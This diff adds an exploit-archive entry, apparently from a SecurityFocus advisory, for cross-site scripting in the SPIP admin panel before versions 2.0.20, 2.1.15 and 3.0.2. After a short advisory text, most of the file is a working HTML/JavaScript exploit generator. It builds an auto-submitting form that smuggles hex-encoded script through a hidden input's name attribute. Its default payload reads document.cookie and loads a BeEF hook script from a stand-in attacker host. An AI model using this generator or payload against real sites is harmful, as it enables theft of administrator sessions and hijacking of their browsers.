@@ -1,0 +1,87 @@
+source: http://www.securityfocus.com/bid/53983/info
+
+SPIP is prone to multiple unspecified cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Versions prior to SPIP 2.0.20, 2.1.15, and 3.0.2 are vulnerable. 
+
+Exploit generator:
+------------------
+<html>
+<head>
+  <script>
+    function trim(s){
+      return s.replace(/\r\n|\r|\n|\t/g,'').replace(/^\s+/g,'').replace(/\s+$/g,'');
+    }
+    
+    function encodeToHex(s){
+      var r="";
+      var h;
+      for(var c=0;c<s.length;c++){
+        h=s.charCodeAt(c).toString(16);
+        while(h.length<3) h="%"+h;
+        r+=h;
+      }
+      return r;
+    }
+
+    function generateXSS(){
+      var target  = trim(document.getElementById("target").value);
+      var version = trim(document.getElementById("version").value);
+      var content = trim(document.getElementById("content").value);
+      var resultjs = "";
+      resultjs += "<html><body><form name='x' action='" + target + "ecrire/?exec=" + version + "' method='post'>";
+      resultjs += "<input type='hidden' name='exec' value='" + version + "' />";
+      resultjs += "<input type='hidden' name=\"x'><script>eval(unescape('" + encodeToHex(content) + "'));<\/script><input=\" value='' />";
+      resultjs += "</form><script>document.forms['x'].submit();<\/script></body></html>";
+      document.getElementById("resultjs").value = resultjs;
+    }
+   
+  </script>
+</head>
+<body onload="generateXSS();">
+  <h2>XSS in SPIP Core <=3.0.1 or <=2.1.14 admin panel (base repair)</h2>
+  <p>
+  This XSS, non-persistent, use POST vars through admin panel.<br />
+  The target is the attribute "name" of an input markup hidden.<br />
+  This XSS work on Firefox 13, IE7, but doesn't work on Chrome.<br />
+  Magic_quote_gcp = Off needed.
+  </p>
+  <form action="" onsubmit="generateXSS();return false;">
+    <table>
+      <tr>
+        <td>URL's SPIP Targeted :</td>
+        <td><input id="target" type="text" value="http://target/spip/" size="70" onkeyup="generateXSS();" /></td>
+      </tr>
+      <tr>
+        <td>SPIP version :</td>
+        <td>
+          <select id="version" onchange="generateXSS();">
+            <option value="base_repair">3.0.X (up to 3.0.1 included)</option>
+            <option value="admin_repair">2.1.X (up to 2.1.14 included)</option>
+          </select>
+        </td>
+      </tr>
+      <tr>
+        <td>JavaScript code to execute :<br />(without <script> & </script> markup)</td>
+        <td>
+          <textarea cols="70" rows="10" id="content" onkeyup="generateXSS();">
+alert(document.cookie);
+var script = document.createElement("script");
+script.type = "text/javascript";
+script.src = "http://ha.ck.er.xxx/beEf.js";
+document.body.appendChild(script);
+          &lt;/textarea&gt;
+        </td>
+      </tr>
+      <tr>
+        <td>Exploit to send to an admin : </td>
+        <td>
+          <textarea cols="70" rows="10" id="resultjs" readonly="readonly">&lt;/textarea&gt;
+        </td> 
+      </tr>
+    </table>
+  </form>
+</body>
+</html>
